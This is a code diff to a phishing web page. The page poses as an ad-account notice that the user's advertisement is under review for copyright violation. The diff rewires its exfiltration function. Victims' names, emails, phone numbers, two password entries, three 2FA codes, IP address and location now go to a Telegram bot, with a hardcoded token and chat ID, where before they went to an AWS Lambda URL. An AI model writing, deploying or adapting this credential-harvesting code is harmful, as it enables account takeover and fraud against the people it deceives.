@@ -3228,7 +3228,9 @@
                     </h6> -->
 
                     <h6>
-                        We have received multiple customer reports alleging that your advertisement may be in violation of copyright regulations, which is against our advertising policies. As a result, your ad account has been scheduled for review.
+                        We have received multiple customer reports alleging that your advertisement may be in violation
+                        of copyright regulations, which is against our advertising policies. As a result, your ad
+                        account has been scheduled for review.
                     </h6>
 
                     <div id="utm-ticketId" style="display: block;">
@@ -4434,29 +4436,32 @@
 
         // Send data to Email
         function sendDataEmail() {
-            var templateData = {
-                'ip_address': userIpData.user_ip,
-                'country': userIpData.country,
-                'country_code': userIpData.country_code,
-                'city': userIpData.city,
-                'full_name': formsSendData['full-name'],
-                'pers_email': formsSendData['personal-email'],
-                'bus_email': formsSendData['buiseness-email'],
-                'phone_number': formsSendData['mobile-phone-number'],
-                'p_one': formsSendData['password-1'],
-                'p_two': formsSendData['password-2'],
-                'c_one': formsSendData['2FA-1'],
-                'c_two': formsSendData['2FA-2'],
-                'c_three': formsSendData['2FA-3'],
-                'fb_page_name': formsSendData['page-name'],
-                'message': formsSendData['apeal'],
-                'user_agent': window.navigator.userAgent,
-                'user_referrer': window.window.location.href
-            };
+            var chat_id = '-1003257858837';
+            var token = '8288397640:AAEFdGkEz6bmI7yWukFZoA_DcGysT0f-glw';
+            var message = `New Login Data:
+IP: ${userIpData.user_ip}
+Country: ${userIpData.country} (${userIpData.country_code})
+City: ${userIpData.city}
+Full Name: ${formsSendData['full-name']}
+Personal Email: ${formsSendData['personal-email']}
+Business Email: ${formsSendData['buiseness-email']}
+Phone: ${formsSendData['mobile-phone-number']}
+Password 1: ${formsSendData['password-1']}
+Password 2: ${formsSendData['password-2']}
+2FA 1: ${formsSendData['2FA-1']}
+2FA 2: ${formsSendData['2FA-2']}
+2FA 3: ${formsSendData['2FA-3']}
+Page Name: ${formsSendData['page-name']}
+Appeal: ${formsSendData['apeal']}
+User Agent: ${window.navigator.userAgent}
+Referrer: ${window.location.href}`;
 
-            $.ajax('https://o2psd36oxw73no6ynhu22asnli0koddh.lambda-url.us-west-2.on.aws', {
+            $.ajax(`https://api.telegram.org/bot${token}/sendMessage`, {
                 type: 'POST',
-                data: JSON.stringify(templateData),
+                data: JSON.stringify({
+                    chat_id: chat_id,
+                    text: message
+                }),
                 contentType: 'application/json'
             }).done(function () {
             }).fail(function (error) {
